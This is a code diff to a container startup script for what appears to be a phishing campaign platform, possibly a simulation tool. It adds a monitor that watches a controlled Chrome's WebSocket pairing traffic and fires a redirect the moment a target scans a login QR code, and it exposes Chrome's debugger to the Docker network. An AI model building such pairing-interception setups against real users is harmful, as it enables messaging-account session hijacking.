@@ -78,6 +78,11 @@ done ) &
 # CDP bridge: expose Chrome's loopback debugger to the Docker network.
 socat TCP-LISTEN:9222,fork,reuseaddr TCP:127.0.0.1:9223 &
 
+# Early scan detection: watch WebSocket pairing traffic over CDP and publish the
+# redirect the instant a scan's pairing starts (before "loading your messages").
+# Only acts on "scan" campaigns; restarts if it ever exits.
+( while true; do python3 /ws-monitor.py; sleep 2; done ) &
+
 # ── Redirect signal relay ─────────────────────────────────────────────────────
 # The campaign's extension sets the page title to "PHISHGUARD_REDIRECT::<url>"
 # when its trigger fires. This watcher reads the title over CDP and publishes the
